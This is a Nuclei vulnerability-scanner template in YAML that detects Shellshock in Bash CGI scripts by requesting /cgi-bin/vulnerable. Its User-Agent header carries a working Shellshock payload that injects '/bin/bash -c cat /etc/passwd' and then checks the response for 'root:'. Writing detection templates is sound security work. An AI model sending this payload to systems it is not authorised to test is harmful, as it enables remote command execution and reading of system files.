id: shellshock-vulnerability-nuclei

info:
  author: me
  name: Shellshock - Remote Code Injection via CGI
  severity: critical
  description: Shellshock vulnerability detection
  tags: shellshock,bash,vulnerabilities

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/vulnerable"
    headers:
      User-Agent: "() { :; }; echo; /bin/bash -c 'cat /etc/passwd'"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "contains(body, 'root:')"